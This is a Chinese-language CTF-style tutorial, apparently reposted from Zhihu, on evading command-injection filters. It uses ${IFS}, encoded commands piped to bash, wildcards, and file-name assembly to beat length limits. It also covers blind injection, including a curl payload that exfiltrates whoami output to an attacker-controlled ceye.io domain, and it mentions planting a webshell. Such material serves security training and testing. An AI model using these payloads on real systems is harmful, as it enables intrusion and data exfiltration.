1、绕过过滤字符
--------

> **原文：[https://zhuanlan.zhihu.com/p/672515980](https://zhuanlan.zhihu.com/p/672515980)**

### 1.1 空格绕过

<1>`${IFS}`，Linux 下有一个特殊的环境变量叫做 IFS，叫做内部字段分隔符（internal field separator）。IFS 环境变量定义了 bash shell 用户字段分隔符的一系列字符。默认情况下，bash shell 会将下面的字符当做字段分隔符：空格、制表符、换行符。

<2>`${IFS}$9`，#`$9`可改成`$`加其他数字。

<3>`{cat,flag.php}`，用`,`实现了空格；指令中的`{}`通配符，shell 会先把`{}`的内容按照解释方式翻译成一个或多个参数，再执行该含有多参数的指令。在 Linux bash 中可以使用`{OS_COMMAND,ARGUMENT}`来执行系统命令，如`{mv,文件1，文件2}`。

<4>`<`，输入重定向，将一个文件的内容作为命令的输入。

<5>`<>`，重定向符

<6>`%20`，URL 传递

<7>`%09`，URL 传递

```
[root@localhost home]#cat${IFS}flag.php

[root@localhost home]# cat${IFS}$9flag.php

[root@localhost home]# {cat,flag.php}

[root@localhost home]# cat<flag.php

[root@localhost home]# cat<>flag.php
```

### 1.2 黑名单绕过

### 1.2.1 拼接变量

黑名单中有 flag，通过拼接变量绕过

```
[root@localhost home]# a=g;cat fla$a.php
[root@localhost home]# a=fl;b=ag;cat $a$b.php
```

### 1.2.2 编码绕过

<1>base64 编码

[https://the-x.cn/encodings/Base64.aspx](https://link.zhihu.com/?target=https%3A//the-x.cn/encodings/Base64.aspx)

```
cat flag.php => Y2F0IGZsYWcucGhw
  
[root@localhost home]# `echo "Y2F0IGZsYWcucGhw"|base64 -d`

[root@localhost home]# $(echo "Y2F0IGZsYWcucGhw"|base64 -d)

[root@localhost home]# echo "Y2F0IGZsYWcucGhw"|base64 -d|bash

[root@localhost home]# echo "Y2F0IGZsYWcucGhw"|base64 -d|sh
```

<2>hex 编码

[https://the-x.cn/encodings/Hex.aspx](https://link.zhihu.com/?target=https%3A//the-x.cn/encodings/Hex.aspx)

```
cat flag.php =>0x63,0x61,0x74,0x20,0x66,0x6C,0x61,0x67,0x2E,0x70,0x68,0x70 =>63617420666c61672e706870
#xxd: 二进制显示和处理文件工具,cat: 以文本方式ASCII显示文件
#-r参数：逆向转换。将16进制字符串表示转为实际的数
#-ps参数：以 postscript的连续16进制转储输出，也叫做纯16进制转储。
#-r -p将纯十六进制转储的反向输出打印为了ASCII格式。
[root@localhost home]# `echo "63617420666c61672e706870"|xxd -r -p`
  
[root@localhost home]# $(echo "63617420666c61672e706870"|xxd -r -p)
  
[root@localhost home]# echo "63617420666c61672e706870"|xxd -r -p|bash
  
[root@localhost home]# echo "63617420666c61672e706870"|xxd -r -p|sh
```

<3>shellcode 编码

```
cat flag.php => \x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70
  
[root@localhost home]# {printf,"\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70"}|bash
  
[root@localhost home]# `{printf,"\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70"}`
  
[root@localhost home]# $(printf "\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70")
```

<4> 利用已有资源

如：从已有的文件或者环境变量中获得相应的字符

```
[root@localhost home]# echo ${PATH}
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin
[root@localhost home]#
[root@localhost home]# echo ${PATH:6:1}
o
[root@localhost home]# echo ${PATH:6:2}
oc
[root@localhost home]# echo ${PATH:1:2}
us
[root@localhost home]# echo ${PATH:0:2}
/u
[root@localhost home]# 
[root@localhost home]# c${PATH:8:1}t flag.php
```

<5> 单引号和双引号

```
[root@localhost home]# cat fl''ag.php
[root@localhost home]# cat fl'a'g.php
[root@localhost home]# cat f""lag.php
[root@localhost home]# cat f"l"ag.php
[root@localhost home]# c""at fl'a'g.php
```

<6> 反斜杠绕过

```
[root@localhost home]# cat f\l\ag.php
[root@localhost home]# ca\t f\lag.php
```

<7>shell 特殊变量

```
$1到$9、$@和$*等

[root@localhost home]# cat fl$1ag.php
[root@localhost home]# cat fl$2ag.php
[root@localhost home]# cat fl$@ag.php
[root@localhost home]# cat fl$*ag.php
```

### 1.3 文件读取绕过

文件读取，最常用的就是 cat 命令。如果 cat 被过滤，可以使用下面命令替代：

```
more:一页一页的显示档案内容
less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页
head:查看头几行
tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
tail:查看尾几行
nl：显示的时候，顺便输出行号
od:以二进制的方式读取档案内容，不加选项默认输出八进制，带 -c 参数则输出字符串内容
vi:一种编辑器，这个也可以查看
vim:一种编辑器，这个也可以查看
sort:可以查看
uniq:可以查看
file -f:报错出具体内容
```

### 1.4 通配符绕过

通配符含义介绍：

[https://www.secpulse.com/archives/96374.html](https://link.zhihu.com/?target=https%3A//www.secpulse.com/archives/96374.html)

```
/???/[:lower:]s =>/bin/ls
[root@localhost home]# /???/[:lower:]s
flag.php  pci
[root@localhost home]# cat f*
[root@localhost home]# /???/?at flag.php
[root@localhost home]# /???/?at ????????
[root@localhost home]# /???/?[a][t] ????????
[root@localhost home]# /???/?[a][t] ?''?''?''?''?''?''?''?''
[root@localhost home]# /???/?[a]''[t] ?''?''?''?''?''?''?''?''
```

### 1.5 内敛执行绕过

内敛，就是将`` `命令` ``或`$(命令)`内命令的输出作为输入执行

```
[root@localhost home]# cat `ls`
cat: pci: 是一个目录

[root@localhost home]# cat $(ls)
cat: pci: 是一个目录
```

### 1.6 长度限制绕过 (文件构造绕过)

通常利用 ls -t、>、>> 和换行符 \ 绕过长度限制

使用 ls -t 命令，可以将文件名按照时间顺序排列出来 (后创建的排在前面)

使用 >，可以将命令结果存入文件中

使用 >>，可以将字符串添加到文件内容末尾，不会覆盖原内容

使用换行符 \，可以将一条命令写在多行

```
linux下可以用 1>a创建文件名为a的空文件
ls -t>test则会将目录按时间排序后写进test文件中
sh命令可以从一个文件中读取命令来执行
```

创建文件名可以连成要执行命令的空文件

```
[root@localhost test]# ls
flag.php
[root@localhost test]# >"php"
[root@localhost test]# >"ag.\\"
[root@localhost test]# >"fl\\"
[root@localhost test]# >"t \\"
[root@localhost test]# >"ca\\"
[root@localhost test]# 
用2个反斜杠的原因：用前1个反斜杠转义后1个反斜杠
```

执行`ls -t>getflag`将目录下的文件名按时间排序后写进 getflag 文件里

```
[root@localhost test]# ls -t>getflag
[root@localhost test]# ls -t
getflag  ca\  t \  fl\  ag.\  php  flag.php
[root@localhost test]#
[root@localhost test]# cat getflag
getflag
ca\
t \
fl\
ag.\
php
flag.php
```

执行`sh getflag`命令，从 getflag 文件中读取命令来执行

```
[root@localhost test]# sh getflag
getflag:行1: getflag: 未找到命令
12345 you get it
getflag:行7: flag.php: 未找到命令
```

另外，长度限制绕过也可用于反弹 shell 命令和`wget 网址 -O webshell.php`命令

2、命令盲注
------

### 2.1 暴力查询

服务器未联网，无回显，无法利用自己总结的无回显命令执行，无写入权限和无法 getshell 等情况下，可以通过枚举 / 二分查找暴力查询 flag。

### 2.2 带外盲注

适用于页面无回显的情况。

例如把 whoami 执行的结果输出到 ceye 网站上，`ff34r0.ceye.io`为自己的域名地址。

ceye 网站：[https://sso.telnet404.com/cas/login](https://link.zhihu.com/?target=https%3A//sso.telnet404.com/cas/login)

```
127.0.0.1&curl `whoami`.ff34r0.ceye.io
```

### 2.3 sleep() 妙用

通过 sleep() 函数判断我们的命令是否执行成功。

```
ls;sleep(5);
```

### 2.4 >/dev/null 2>&1 类无回显

代码中插入了`>/dev/null 2>&1`，`>/dev/null 2>&1`的作用就是不回显。利用分隔符`||`即可绕过，分隔符的含义是前一条命令执行失败了才会执行后一条命令。

```
ls || >/dev/null 2>&1
```

3、无字母数字 webshell
----------------

`.`或者叫 period，它的作用和 source 一样，就是用当前的 shell 执行一个文件中的命令。比如，当前运行的 shell 是 bash，则`. file`的意思就是用 bash 执行 file 文件中的命令。用. file 执行文件，是不需要 file 有 x 权限的。

```
[root@localhost home]# cat flag.php
[root@localhost home]
[root@localhost home]# cat a.txt
cat flag.php
[root@localhost home]
[root@localhost home]# . /home/a.txt
```

4、无字母数字 RCE
-----------

利用异或、或、取反等操作进行绕过